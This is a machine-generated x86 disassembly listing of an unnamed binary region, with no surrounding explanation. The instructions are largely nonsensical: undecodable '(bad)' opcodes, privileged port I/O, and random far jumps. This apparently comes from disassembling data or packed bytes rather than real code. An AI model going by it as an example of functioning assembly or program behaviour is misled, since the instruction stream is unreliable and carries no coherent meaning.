  4181bb:	rcl    BYTE PTR [edx],cl
  4181bd:	cld    
  4181be:	mov    ch,0x4c
  4181c0:	sbb    eax,0x6df5e1bc
  4181c5:	mov    DWORD PTR [ebx+ecx*1+0x30],esi
  4181c9:	mov    BYTE PTR [eax-0x32a2b381],cl
  4181cf:	mov    al,0x68
  4181d1:	pop    ss
  4181d2:	xor    eax,0x3ac9989b
  4181d7:	jge    0x4181e2
  4181d9:	mov    dl,0x18
  4181db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181dc:	xchg   BYTE PTR [esi-0x1f],ch
  4181df:	leave  
  4181e0:	ins    DWORD PTR es:[edi],dx
  4181e1:	clc    
  4181e2:	sbb    al,0x79
  4181e4:	icebp  
  4181e5:	mov    ch,0x65
  4181e7:	sysexit 
  4181e9:	(bad)  
  4181ea:	mov    ecx,0xf3ee481d
  4181ef:	call   0x67a69dd2
  4181f4:	jae    0x418227
  4181f6:	xor    ebp,edi
  4181f8:	adc    eax,DWORD PTR [ebx-0x24]
  4181fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181fc:	sar    BYTE PTR [edx],cl
  4181fe:	xchg   esp,eax
  4181ff:	pop    esp
  418200:	ins    DWORD PTR es:[edi],dx
  418201:	pop    ebp
  418202:	adc    DWORD PTR [ecx+0x1d],esp
  418205:	mov    al,ds:0x4b286b15
  41820a:	shl    DWORD PTR [ebp+0x506548ba],1
  418210:	pop    es
  418211:	retf   
  418212:	xchg   edi,eax
  418213:	stc    
  418214:	dec    esi
  418215:	pop    esp
  418216:	lea    esi,[esi]
  418218:	lock inc esp
  41821a:	and    BYTE PTR [edx],0x92
  41821d:	jno    0x4181ec
  41821f:	cld    
  418220:	mov    al,0x1f
  418222:	xchg   ecx,eax
  418223:	scas   al,BYTE PTR es:[edi]
  418224:	dec    esi
  418225:	int    0x3c
  418227:	test   cl,cl
  418229:	mov    ecx,0x38700a68
  41822e:	inc    edi
  41822f:	data16 fsubrp st(2),st
  418232:	aam    0x91
  418234:	and    DWORD PTR [ebp+0x4f7326e4],esi
  41823a:	in     eax,dx
  41823b:	rcr    edi,cl
  41823d:	add    ah,ah
  41823f:	mov    ebx,0x9dbda0d0
  418244:	fstp   TBYTE PTR [ecx]
  418246:	add    edx,DWORD PTR [eax-0x18]
  418249:	pusha  
  41824a:	xchg   esp,eax
  41824b:	ins    DWORD PTR es:[edi],dx
  41824c:	sbb    esi,DWORD PTR [eax+0x121ac744]
  418252:	rol    ebx,0x2d
  418255:	dec    ebx
  418256:	xor    edi,edx
  418258:	mov    edx,0xdbdb1865
  41825d:	pusha  
  41825e:	xchg   BYTE PTR [edi+0x41],ah
  418261:	mov    ecx,0x7ba8de88
  418266:	add    al,0x71
  418268:	fwait
  418269:	pop    ecx
  41826a:	loopne 0x4182e8
  41826c:	jmp    0x4038d541
  418271:	sub    BYTE PTR [edi+0x50],bl
  418274:	jg     0x41829f
  418276:	jo     0x418298
  418278:	les    ecx,FWORD PTR [ebx-0x37d2a3e9]
  41827e:	scas   al,BYTE PTR es:[edi]
  41827f:	fcomp  DWORD PTR [ecx]
  418281:	jns    0x41829e
  418283:	push   edx
  418284:	dec    eax
  418285:	push   ds
  418286:	inc    eax
  418287:	xchg   ebp,eax
  418288:	(bad)  [edx]
  41828a:	sub    ch,al
  41828c:	test   al,0x94
  41828e:	mov    eax,0x90d14c8d
  418293:	jb     0x4182f9
  418295:	inc    ebp
  418296:	outs   dx,BYTE PTR ds:[si]
  418298:	push   eax
  418299:	scas   eax,DWORD PTR es:[edi]
  41829a:	pop    edi
  41829b:	xchg   ebp,eax
  41829c:	(bad)  
  41829d:	mov    esi,0x124d2f2b
  4182a2:	test   BYTE PTR [esi+0x48],ch
  4182a5:	add    eax,0xd3767c95
  4182aa:	lock pop ebx
  4182ac:	out    0x79,al
  4182ae:	pop    esp
  4182af:	scas   eax,DWORD PTR es:[edi]
  4182b0:	shl    DWORD PTR [esi],0xb6
  4182b3:	inc    eax
  4182b4:	xchg   ebx,eax
  4182b5:	xchg   ecx,eax
  4182b6:	(bad)  
  4182b7:	mov    cl,0x8b
  4182b9:	inc    edi
  4182ba:	test   al,0xb4
  4182bc:	and    al,BYTE PTR [ebx+0x329c18d4]
  4182c2:	test   DWORD PTR [ebx-0x61],ebp
  4182c5:	js     0x418287
  4182c7:	dec    eax
  4182c8:	jns    0x41831f
  4182ca:	xlat   BYTE PTR ds:[ebx]
  4182cb:	adc    ebx,esi
  4182cd:	std    
  4182ce:	js     0x41831c
  4182d0:	test   DWORD PTR [eax-0x2],ebx
  4182d3:	jns    0x418266
  4182d5:	sub    DWORD PTR ds:0x50d78212,esp
  4182db:	adc    eax,0x15d928c9
  4182e0:	mov    ds:0x6e106412,al
  4182e5:	dec    esp
  4182e6:	dec    ebp
  4182e7:	inc    esp
  4182e8:	jns    0x4182a4
  4182ea:	pop    ebp
  4182eb:	add    edx,DWORD PTR ds:0x2f1a5f6d
  4182f1:	outs   dx,DWORD PTR ds:[esi]
  4182f2:	push   ecx
  4182f3:	xchg   ebp,eax
  4182f4:	into   
  4182f5:	or     BYTE PTR [ecx-0x42],cl
  4182f8:	retf   
  4182f9:	out    0x3a,al
  4182fb:	push   ecx
  4182fc:	imul   ecx,DWORD PTR [esi-0x40ed75c9],0xffffff85
  418303:	test   eax,0xd791a828
  418308:	mov    ebx,0x239f0e59
  41830d:	push   eax
  41830e:	les    esi,FWORD PTR gs:[edx+0x3a]
  418312:	or     BYTE PTR fs:[edi+0x11],bh
  418316:	jb     0x4182d0
  418318:	out    0x25,al
  41831a:	jbe    0x41837d
  41831c:	xchg   ecx,eax
  41831d:	leave  
  41831e:	mov    ds:0x91d16f26,eax
  418323:	or     eax,0xa253b81
  418328:	mov    edi,0xc77d938e
  41832d:	ror    DWORD PTR [esi+0x6734f16d],1
  418333:	outs   dx,BYTE PTR ds:[esi]
  418334:	mov    al,0xa0
  418336:	mov    eax,0xb4cfee17
  41833b:	lods   eax,DWORD PTR ds:[esi]
  41833c:	cdq    
  41833d:	pop    ecx
  41833e:	jmp    0xadfbfa9c
  418343:	xchg   edx,eax
  418344:	mov    bl,0x12
  418346:	push   edi
  418347:	hlt    
  418348:	add    al,0xbd
  41834a:	jp     0x41835c
  41834c:	in     al,dx
  41834d:	ins    BYTE PTR es:[edi],dx
  41834e:	enter  0x6e51,0x10
  418352:	bnd jne 0x4182fa
  418355:	out    0xbb,al
  418357:	mov    ds:0xdf87abdb,al
  41835c:	out    0x57,al
  41835e:	js     0x418342
  418360:	(bad)  
  418361:	push   esp
  418362:	outs   dx,BYTE PTR ds:[esi]
  418363:	dec    DWORD PTR [edi]
  418365:	pop    es
  418366:	pop    esi
  418367:	xchg   ecx,eax
  418368:	jnp    0x41836e
  41836a:	neg    DWORD PTR [ecx+ebx*2+0x9]
  41836e:	loopne 0x4183e0
  418370:	repz jmp 0x2811094d
  418376:	dec    ecx
  418377:	sub    esi,DWORD PTR [edx]
  418379:	rol    DWORD PTR [ebp+0x5d],1
  41837c:	test   eax,0x8de9f027
  418381:	xor    eax,0xbd38653f
  418386:	outs   dx,BYTE PTR ds:[esi]
  418387:	mov    bl,0xf6
  418389:	ja     0x418314
  41838b:	adc    al,0xf7
  41838d:	jmp    0x4183f7
  41838f:	(bad)  
  418390:	shl    DWORD PTR [ebp+0x2a358101],1
  418396:	mov    esi,ecx
  418398:	rcr    BYTE PTR [ecx],0xf0
  41839b:	push   edx
  41839c:	jbe    0x418343
  41839e:	push   esi
  41839f:	mov    edx,0x3e9556cc
  4183a4:	out    0x86,al
  4183a6:	and    eax,0x91cfc181
  4183ab:	mov    ebx,0x6bd6960a
  4183b0:	mov    cl,ah
  4183b2:	ror    bh,1
  4183b4:	das    
  4183b5:	jbe    0x41836d
  4183b7:	push   0x776c788
  4183bc:	inc    esp
  4183bd:	(bad)  
  4183bf:	cli    
  4183c0:	js     0x418420
  4183c2:	pop    esp
  4183c3:	xchg   edx,eax
  4183c4:	aaa    
  4183c5:	push   edi
  4183c6:	sub    bh,BYTE PTR [edx]
  4183c8:	iret   
  4183c9:	shr    DWORD PTR [edi-0x7cf0d74f],0xca
  4183d0:	xor    DWORD PTR [eax+0x4c],ecx
  4183d3:	imul   esp,DWORD PTR [ecx],0xa9792413
  4183d9:	mov    al,ds:0x4c8634ef
  4183de:	xor    eax,DWORD PTR [edx-0x7323b4d8]
  4183e4:	out    dx,al
  4183e5:	xchg   BYTE PTR [ebp-0x229e55e8],cl
  4183eb:	xlat   BYTE PTR ds:[ebx]
  4183ec:	jecxz  0x418398
  4183ee:	rcr    al,1
  4183f0:	lahf   
  4183f1:	adc    eax,ebx
  4183f3:	jae    0x4183fa
  4183f5:	mov    eax,edi
  4183f7:	mov    eax,ds:0xe68ba825
  4183fc:	push   DWORD PTR [edi]
  4183fe:	(bad)  
  4183ff:	fldenv [ebx+0x7c]
  418402:	xor    cl,0xe0
  418405:	(bad)  
  418406:	lods   eax,DWORD PTR ds:[esi]
  418407:	mov    esp,?
  418409:	pusha  
  41840a:	lock not BYTE PTR [eax-0x43]
  41840e:	mov    ecx,0xb6e03790
  418413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418414:	cmp    eax,0xbd423d4
  418419:	outs   dx,DWORD PTR ds:[esi]
  41841a:	jmp    0xcccc:0x7f237481
  418421:	or     DWORD PTR [eax],0xd4c18e8b
  418427:	cmp    ebp,esp
  418429:	fimul  DWORD PTR [ebx]
  41842b:	retf   
  41842c:	mov    ds,WORD PTR [ecx+0x41]
  41842f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418430:	int    0xf0
  418432:	popf   
  418433:	pushf  
  418434:	dec    ecx
  418435:	push   0xffffffa4
  418437:	inc    edi
  418438:	enter  0xc7b5,0x36
  41843c:	xchg   esp,eax
  41843d:	cmp    al,0x25
  41843f:	push   edx
  418440:	inc    esi
  418441:	add    BYTE PTR [ebx-0x61c95fed],bl
  418447:	inc    ebp
  418448:	(bad)  
  41844a:	jl     0x4183e8
  41844c:	call   0x5bca57ed
  418451:	jecxz  0x4184cc
  418453:	push   ds
  418454:	test   al,0x31
  418456:	fwait
  418457:	add    eax,0x3f8220b2
  41845c:	ret    0x1642
  41845f:	adc    al,0xed
  418461:	inc    ebp
  418462:	pop    es
  418463:	int    0xac
  418465:	test   DWORD PTR [edi+0x6d],0xdb8d9f17
  41846c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41846d:	pop    edi
  41846e:	push   ebp
  41846f:	jns    0x41840d
  418471:	jmp    0x4184dc
  418473:	gs in  al,0x8f
  418476:	jno    0x41844e
  418478:	and    esp,esp
  41847a:	je     0x418439
  41847c:	mov    bh,0x79
  41847e:	adc    al,0x38
  418480:	in     eax,dx
  418481:	xor    eax,0xfccc7543
  418486:	jle    0xb52831c1
  41848c:	aas    
  41848d:	scas   eax,DWORD PTR es:[edi]
  41848e:	or     ebp,ebp
  418490:	xor    eax,0xea3ee13e
  418495:	cmp    al,0x1d
  418497:	sub    edi,DWORD PTR [ebx+0x73b0d70d]
  41849d:	bound  ecx,QWORD PTR [ecx-0x34262b71]
  4184a3:	xchg   ebx,eax
  4184a4:	push   ecx
  4184a5:	or     BYTE PTR [edx],bh
  4184a7:	fnstsw WORD PTR [edi]
  4184a9:	popa   
  4184aa:	dec    edi
  4184ab:	cmc    
  4184ac:	in     al,0x39
  4184ae:	mov    gs,WORD PTR [esi+0x79]
  4184b1:	inc    esp
  4184b2:	in     al,dx
  4184b3:	jnp    0x41848c
  4184b5:	jmp    DWORD PTR [ebp-0x41f43215]
  4184bb:	xchg   edx,eax
  4184bc:	in     al,dx
  4184bd:	mov    dl,BYTE PTR [ebx]
  4184bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c0:	jnp    0x4184ef
  4184c2:	xchg   edi,eax
  4184c3:	adc    BYTE PTR [ebx-0x9],bl
  4184c6:	sbb    ah,BYTE PTR [ebx+0x6f]
  4184c9:	sbb    ebx,DWORD PTR [eax+ebp*4]
  4184cc:	test   eax,0x4ae08a91
  4184d1:	dec    edi
  4184d2:	xor    al,0x46
  4184d5:	(bad)  
  4184d6:	mov    edi,0x802d518b
  4184db:	mov    BYTE PTR [ecx+0x12],ah
  4184de:	and    BYTE PTR [ebx+0x175aebb8],al
  4184e4:	pop    ebp
  4184e5:	rcr    DWORD PTR [edi+0x3912cfea],0xb4
  4184ec:	aam    0xeb
  4184ee:	sbb    edx,DWORD PTR ds:0x4bd5a3c8
  4184f4:	(bad)  
  4184f7:	pushf  
  4184f8:	or     DWORD PTR [edi-0x5a56c540],esi
  4184fe:	pop    esi
  4184ff:	(bad)  
  418500:	mov    edi,0x920a5af8
  418505:	push   ebp
  418506:	into   
  418507:	add    DWORD PTR [eax-0x58618a65],edx
  41850d:	cmp    al,0x9
  41850f:	add    eax,0xe547bb99
  418514:	fist   DWORD PTR [eax+0x59]
  418517:	nop
  418518:	jb     0x418539
  41851a:	mov    ds:0xd03c4d7b,eax
  41851f:	cwde   
  418520:	(bad)  
  418521:	leave  
  418522:	cli    
  418523:	inc    ecx
  418524:	mov    dh,0xc8
  418526:	push   ebx
  418527:	inc    esi
  418528:	adc    al,0xc3
  41852a:	or     ebx,DWORD PTR [ecx+0x58c797e5]
  418530:	push   ecx
  418531:	arpl   sp,dx
  418533:	mov    ch,0x61
  418535:	sub    ch,BYTE PTR [edi]
  418537:	jge    0x418597
  418539:	les    eax,FWORD PTR [esi+0x9]
  41853c:	out    dx,al
  41853d:	pop    es
  41853e:	push   cs
  41853f:	loop   0x418554
  418541:	add    eax,0x5c33563f
  418546:	jg     0x41852c
  418548:	imul   ebp,DWORD PTR [eax+0x12],0x191f0dca
  41854f:	leave  
  418550:	sbb    bl,dh
  418552:	sub    BYTE PTR [ecx+0x32],0x0
  418556:	adc    al,0x3d
  418558:	fs das 
  41855a:	ret    0x7bad
  41855d:	and    ebp,esi
  41855f:	into   
  418560:	fdivr  DWORD PTR [esi-0x4de5cb13]
  418566:	inc    ebp
  418567:	dec    ebp
  418568:	xor    ebx,DWORD PTR [edi]
  41856a:	in     al,dx
  41856b:	pop    ebp
  41856c:	push   0x3478e03
  418571:	stos   DWORD PTR es:[edi],eax
  418572:	pusha  
  418573:	sti    
  418574:	add    eax,0xd09b6307
  418579:	ds je  0x418564
  41857c:	punpcklbw mm4,DWORD PTR [ebx+0x7e917c54]
  418583:	pop    esp
  418585:	in     eax,dx
  418586:	mov    eax,0x79115849
  41858b:	xchg   esp,eax
  41858c:	mov    ch,0x39
  41858e:	and    BYTE PTR [ebx-0x7762b3f7],ah
  418594:	sub    eax,0x3de215de
  418599:	and    BYTE PTR [ecx+ebp*8],dl
  41859c:	bound  ebx,QWORD PTR [esi*8+0x2953cfce]
  4185a3:	aam    0x4e
  4185a5:	cdq    
  4185a6:	pause  
  4185a8:	ja     0x41861f
  4185aa:	scas   eax,DWORD PTR es:[edi]
  4185ab:	cwde   
  4185ac:	xchg   edi,eax
  4185ad:	shl    BYTE PTR [edx-0x1a],cl
  4185b0:	retf   0xd70b
  4185b3:	rol    BYTE PTR [edx+0x25],0xa
  4185b7:	xchg   ebp,eax
  4185b8:	int3   
  4185b9:	adc    BYTE PTR [ebx-0x35],0xac
  4185bd:	leave  
  4185be:	inc    esp
  4185bf:	adc    ah,0xbc
  4185c2:	out    0x51,eax
  4185c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185c5:	and    eax,0xdc11b570
  4185ca:	mov    bl,0x95
  4185cc:	xor    eax,0x7803c85
  4185d1:	stc    
  4185d2:	sub    al,0xa2
  4185d4:	mov    ch,0x9b
  4185d6:	push   ebx
  4185d7:	hlt    
  4185d8:	test   BYTE PTR [eax],cl
  4185da:	pop    edx
  4185db:	out    dx,al
  4185dc:	push   ecx
  4185dd:	ins    DWORD PTR es:[edi],dx
  4185de:	out    dx,eax
  4185df:	not    BYTE PTR [esi-0x5]
  4185e2:	cld    
  4185e3:	push   esp
  4185e4:	push   ss
  4185e5:	(bad)  
  4185e6:	jno    0x41865f
  4185e8:	xchg   ecx,eax
  4185e9:	call   0x94b7b29e
  4185ee:	stos   BYTE PTR es:[edi],al
  4185ef:	pop    ebp
  4185f0:	bound  edx,QWORD PTR [esi+0x23]
  4185f3:	ret    
  4185f4:	inc    edx
  4185f5:	(bad)  
  4185f6:	lds    edx,FWORD PTR [ebx+0x2f675fc8]
  4185fc:	mov    esp,0xb5bd652a
  418601:	mov    ah,0x85
  418603:	das    
  418604:	or     edi,ecx
  418606:	shl    edx,cl
  418608:	call   0xe2b46467
  41860d:	mov    ?,WORD PTR [esi+0x5f]
  418610:	bound  esp,QWORD PTR ds:0x78eb96c6
  418616:	push   esi
  418617:	push   0x7dbcb48a
  41861c:	jge    0x41862b
  41861e:	fist   WORD PTR [eax-0x3d7385d1]
  418624:	xchg   esi,eax
  418625:	ficom  DWORD PTR [edx+ebp*1-0x365654c3]
  41862c:	or     BYTE PTR [eax+0x51],ah
  41862f:	cdq    
  418630:	shl    ah,0xc9
  418633:	out    dx,eax
  418634:	lods   eax,DWORD PTR ds:[esi]
  418635:	fadd   QWORD PTR gs:[ecx]
  418638:	dec    edi
  418639:	or     edx,0xffffffbd
  41863c:	in     al,0x11
  41863e:	aas    
  41863f:	aad    0x29
  418641:	lods   eax,DWORD PTR ds:[esi]
  418642:	scas   al,BYTE PTR es:[edi]
  418643:	lods   eax,DWORD PTR ds:[esi]
  418644:	test   edi,esp
  418646:	push   ds
  418647:	aaa    
  418648:	pop    esp
  418649:	enter  0x47b7,0x5
  41864d:	call   0xd5c6:0x59b26933
  418654:	arpl   WORD PTR [edx+ebp*1],cx
  418657:	inc    ecx
  418658:	mov    ebp,0x24d60461
  41865d:	scas   al,BYTE PTR es:[edi]
  41865e:	mov    dl,0x6
  418660:	cld    
  418661:	lock dec ebx
  418663:	lds    ebp,FWORD PTR [eax]
  418665:	mov    bl,0x5f
  418667:	aad    0xf3
  418669:	pop    es
  41866a:	bound  ebp,QWORD PTR [ecx-0x2eceafba]
  418670:	cmp    ebp,DWORD PTR [ecx+edx*4-0x3fc4ef3]
  418677:	xor    eax,0x8ce0a0be
  41867c:	js     0x41865e
  41867e:	inc    edi
  41867f:	pop    edx
  418680:	clc    
  418681:	retf   
  418682:	xchg   esi,eax
  418683:	xchg   ecx,esp
  418685:	or     edi,DWORD PTR [eax+0x39]
  418688:	inc    esi
  418689:	sbb    BYTE PTR [edi-0x36],0x6f
  41868d:	ins    DWORD PTR es:[edi],dx
  41868e:	fsub   QWORD PTR [eax]
  418690:	je     0x4186c5
  418692:	nop
  418693:	add    al,0xc3
  418695:	retf   
  418696:	adc    bl,BYTE PTR [ebp+ecx*1+0x48affa14]
  41869d:	or     DWORD PTR [bx+di+0x122b],0xf
  4186a3:	test   al,0xee
  4186a5:	mov    al,0xda
  4186a7:	pusha  
  4186a8:	jmp    0x4186f5
  4186aa:	psubusb mm0,QWORD PTR [edi+0x86a773d]
  4186b1:	or     DWORD PTR [eax-0x6a675fb0],ebp
  4186b7:	cmc    
  4186b8:	mov    dl,0x2b
  4186ba:	push   ebp
  4186bb:	sbb    ch,ah
  4186bd:	icebp  
  4186be:	(bad)
  4186c2:	(bad)  
  4186c3:	out    dx,al
  4186c4:	ja     0x4186e4
  4186c6:	loope  0x41870c
  4186c8:	adc    DWORD PTR [edi-0x4e],esp
  4186cb:	and    ebp,DWORD PTR [ecx]
  4186cd:	pop    edx
  4186ce:	fcom   DWORD PTR [ebp+edx*1-0x55]
  4186d2:	jmp    0x41869b
  4186d4:	nop
  4186d5:	push   ebx
  4186d6:	(bad)  [edx-0x20]
  4186d9:	pop    edi
  4186da:	jmp    0xd4a3e844
  4186df:	dec    ebx
  4186e0:	jns    0x41867e
  4186e2:	or     al,BYTE PTR [ebx+0x57]
  4186e5:	dec    edx
  4186e6:	push   ss
  4186e7:	es dec edx
  4186e9:	bound  ecx,QWORD PTR gs:[ebx+0x72]
  4186ed:	aaa    
  4186ee:	mov    ss,WORD PTR [esi]
  4186f0:	dec    ebx
  4186f1:	inc    esp
  4186f2:	sub    eax,0x15b5cc96
  4186f7:	dec    esp
  4186f8:	inc    esp
  4186f9:	jg     0x41875a
  4186fb:	inc    esi
  4186fc:	mov    cs,WORD PTR [edi]
  4186fe:	in     eax,0x70
  418700:	dec    ebp
  418701:	fist   DWORD PTR [ebx]
  418703:	or     ch,BYTE PTR [edi-0x3]
  418706:	sub    dh,BYTE PTR [ebx-0x80]
  418709:	jle    0x418729
  41870b:	cmp    BYTE PTR [edi+0x2c0b3b5],bl
  418711:	mov    ebx,0xbf9a5401
  418716:	cmp    DWORD PTR [ebx-0x39],ecx
  418719:	add    eax,0xca140b1f
  41871e:	cli    
  41871f:	xchg   DWORD PTR [esi],ecx
  418721:	scas   al,BYTE PTR es:[edi]
  418722:	jns    0x4186fd
  418724:	jnp    0x41871a
  418726:	retf   
  418727:	(bad)  
  418728:	leave  
  418729:	lds    esp,FWORD PTR [ecx+0x48]
  41872c:	xchg   ah,dh
  41872e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41872f:	test   eax,0x48227e22
  418734:	ja     0x41875d
  418736:	cmp    eax,0x520217f
  41873b:	sub    al,0xed
  41873d:	mov    eax,DWORD PTR [ecx-0x3910d75d]
  418743:	xor    DWORD PTR [ecx+ecx*1],esp
  418746:	gs test dh,bh
  418749:	lods   al,BYTE PTR ds:[esi]
  41874a:	ins    BYTE PTR es:[edi],dx
  41874b:	xchg   esi,eax
  41874c:	and    ebp,DWORD PTR [esi+0x29dfbca0]
  418752:	mov    eax,ds:0xff4ef40e
  418757:	xchg   edx,eax
  418758:	std    
  418759:	ins    BYTE PTR es:[edi],dx
  41875a:	test   eax,0x7612076
  41875f:	fneni(8087 only) 
  418761:	test   al,0xeb
  418763:	dec    ecx
  418764:	and    DWORD PTR [ebx+eax*1],eax
  418767:	fdiv   DWORD PTR [ebx+0x7b9b404]
  41876d:	sub    esi,DWORD PTR [esi+0x8]
  418770:	mov    ecx,0x2c0c7660
  418775:	jmp    DWORD PTR [edx-0x5a7ba079]
  41877b:	retf   0xa4d8
  41877e:	lods   eax,DWORD PTR ds:[esi]
  41877f:	int    0x7
  418781:	sahf   
  418782:	sbb    DWORD PTR [edx+0x4a],edi
  418785:	push   ss
  418786:	add    edx,ecx
  418788:	in     al,dx
  418789:	jp     0x418752
  41878b:	mov    dl,0xa4
  41878d:	in     eax,dx
  41878e:	pop    es
  41878f:	(bad)  
  418790:	jge    0x41877c
  418792:	int    0x58
  418794:	dec    ebx
  418795:	mov    ch,0x37
  418797:	xlat   BYTE PTR ds:[ebx]
  418798:	mov    eax,ds:0xe108a76c
  41879d:	cli    
  41879e:	aad    0x7f
  4187a0:	fstp   DWORD PTR [ebp+0x38696485]
  4187a6:	adc    DWORD PTR [ecx-0x6e4b4d4c],0xc808e29
  4187b0:	out    dx,eax
  4187b1:	lock sub bh,BYTE PTR [eax]
  4187b4:	pop    esp
  4187b5:	or     al,0x4a
  4187b7:	cmp    eax,0x7f997657
  4187bc:	adc    al,0x8e
  4187be:	lock scas al,BYTE PTR es:[edi]
  4187c0:	xchg   esp,eax
  4187c1:	xlat   BYTE PTR ds:[ebx]
  4187c2:	xor    al,0x83
  4187c4:	and    al,0xd2
  4187c7:	pop    ds
  4187c8:	fdiv   st(1),st
  4187ca:	mov    ds:0xc413ca5e,al
  4187cf:	adc    eax,0x637af9a
  4187d4:	test   eax,0x8a264925
  4187d9:	mov    al,ds:0x7efc9115
  4187de:	xor    DWORD PTR [esi-0x7cd71ea2],eax
  4187e4:	loopne 0x418778
  4187e6:	popa   
  4187e7:	lds    esp,FWORD PTR [ecx]
  4187e9:	ja     0x418821
  4187eb:	arpl   WORD PTR [ecx-0x1e],si
  4187ee:	aaa    
  4187ef:	dec    edx
  4187f0:	(bad)  
  4187f1:	loope  0x4187f8
  4187f3:	cli    
  4187f4:	loope  0x4187bb
  4187f6:	mov    cl,0x1e
  4187f8:	pop    ebx
  4187f9:	loopne 0x4187ba
  4187fb:	jg     0x418861
  4187fd:	(bad)  
  4187ff:	fwait
  418800:	push   bp
  418802:	mov    ds:0x57eff89b,eax
  418807:	pop    ebp
  418808:	dec    edi
  418809:	fst    QWORD PTR [eax+0x238c42f1]
  41880f:	outs   dx,BYTE PTR ds:[esi]
  418810:	pop    eax
  418811:	inc    eax
  418812:	popa   
  418813:	or     cl,0x8c
  418816:	lds    ebx,FWORD PTR [ebx]
  418818:	loope  0x418832
  41881a:	(bad)  
  41881b:	mov    ah,0x98
  41881d:	(bad)  
  41881e:	popa   
  41881f:	(bad)  
  418820:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418822:	pusha  
  418823:	or     esp,DWORD PTR [ecx-0x3bbbf03a]
  418829:	jo     0x4187f6
  41882b:	lds    eax,FWORD PTR [esi-0x1b]
  41882e:	mov    es,edx
  418830:	push   0xaaf39c5d
  418835:	sar    BYTE PTR [edx],0xb9
  418838:	fcomip st,st(3)
  41883a:	sub    eax,DWORD PTR [edx+ebx*2-0x4ed4ed27]
  418841:	sbb    eax,0xd8b41747
  418846:	gs sub al,0xb
  418849:	pop    esp
  41884a:	sub    eax,0xaadf3763
  41884f:	imul   edi,DWORD PTR [esi],0x37
  418852:	add    eax,0xd0130f86
  418857:	dec    edx
  418858:	cmp    al,0xc9
  41885a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41885b:	test   eax,0x48f358e2
  418860:	jecxz  0x418871
  418862:	cmp    eax,0x150f4675
  418867:	scas   al,BYTE PTR es:[edi]
  418868:	mov    WORD PTR gs:[edx],?
  41886b:	test   BYTE PTR [esi-0x2cb689bb],cl
  418871:	les    esp,FWORD PTR [edx+eiz*1-0x4a]
  418875:	fadd   QWORD PTR [edx+0x15]
  418878:	xor    ecx,DWORD PTR [edx+0xd]
  41887b:	jae    0x418877
  41887d:	lahf   
  41887e:	push   cs
  41887f:	pop    ss
  418880:	xcrypt-ofb (bad)
  418881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418882:	in     al,dx
  418883:	test   DWORD PTR [edi],ebx
  418885:	sub    eax,0x6fd64e30
  41888a:	sbb    al,0x76
  41888c:	jmp    0x76c4:0xc799617e
  418893:	out    dx,eax
  418894:	fsub   DWORD PTR [edi+0x23]
  418897:	or     ah,BYTE PTR [ebp-0x35]
  41889a:	push   esp
  41889b:	sti    
  41889c:	push   es
  41889d:	ja     0x418872
  41889f:	fistp  DWORD PTR [edx+eax*2-0x18]
  4188a3:	iret   
  4188a4:	push   ebx
  4188a5:	shl    BYTE PTR ds:0xbcb98b7a,cl
  4188ab:	repnz sbb al,bh
  4188ae:	sub    edx,DWORD PTR [edi-0x63a84c13]
  4188b4:	(bad)  
  4188b5:	popa   
  4188b6:	xchg   ebp,eax
  4188b7:	cmp    BYTE PTR [eax+ebp*8],0x4e
  4188bb:	loope  0x418871
  4188bd:	xchg   DWORD PTR [ecx-0x42383e34],ecx
  4188c3:	js     0x41884e
  4188c5:	lock dec edi
  4188c7:	cli    
  4188c8:	pushf  
  4188c9:	ror    BYTE PTR [edi],cl
  4188cb:	dec    edx
  4188cc:	mov    dl,al
  4188ce:	fsubr  DWORD PTR [ebx]
  4188d0:	jmp    0x22be04b7
  4188d5:	sbb    BYTE PTR [edx],bl
  4188d7:	inc    edi
  4188d8:	sub    BYTE PTR ss:[ecx+ebx*2-0x133a3426],0xd
  4188e1:	jle    0x418871
  4188e3:	mov    esi,0xc0b1d143
  4188e8:	neg    BYTE PTR [ecx]
  4188ea:	xchg   ebp,eax
  4188eb:	ins    DWORD PTR es:[edi],dx
  4188ec:	in     al,dx
  4188ed:	pop    ecx
  4188ee:	push   edi
  4188ef:	inc    ebp
  4188f0:	xor    BYTE PTR [edx+0x78e09d4e],al
  4188f6:	pop    eax
  4188f7:	and    ecx,DWORD PTR [edi-0xe]
  4188fa:	dec    edx
  4188fb:	icebp  
  4188fc:	call   0xf359:0x55d3b6f5
  418903:	inc    esp
  418904:	and    al,0x5
  418906:	pop    ecx
  418907:	jmp    0x3e32:0xc7eaa6ed
  41890e:	in     eax,0x95
  418910:	and    eax,0x64105ea1
  418915:	stos   DWORD PTR es:[edi],eax
  418916:	push   esp
  418917:	cmp    DWORD PTR [eax-0xee1722b],0x7a2c76dc
  418921:	sbb    DWORD PTR [eax],edx
  418923:	adc    dl,dh
  418925:	call   0xece8cf30
  41892a:	out    dx,eax
  41892b:	retw   0x1275
  41892f:	(bad)  
  418930:	out    dx,al
  418931:	loope  0x418957
  418933:	add    eax,0x777bc43e
  418938:	inc    esp
  418939:	ss out dx,eax
  41893b:	jge    0x418963
  41893d:	popf   
  41893e:	cdq    
  41893f:	jmp    0x4eaf:0x59fa183f
  418946:	push   esi
  418947:	mov    eax,ds:0x26fd1426
  41894c:	sub    eax,0xf497f8ed
  418951:	sub    BYTE PTR [ebp-0x7d],dh
  418954:	mov    bl,0x4d
  418956:	jo     0x418976
  418958:	repnz in eax,dx
  41895a:	in     al,dx
  41895b:	cmp    cl,BYTE PTR [edx-0x13]
  41895e:	(bad)  
  418960:	mov    BYTE PTR [edx-0x19],al
  418963:	push   ebp
  418964:	mov    ds:0xfede04e2,eax
  418969:	mov    ds:0xad400455,al
  41896e:	leave  
  41896f:	sub    ebp,ecx
  418971:	push   eax
  418972:	iret   
  418973:	cmp    ah,ch
  418975:	test   al,0x1c
  418977:	dec    esp
  418978:	cmp    cl,0xb7
  41897b:	gs xchg edx,edi
  41897e:	mov    eax,0xb6bae9fd
  418983:	xchg   edi,eax
  418984:	push   esp
  418985:	pop    ecx
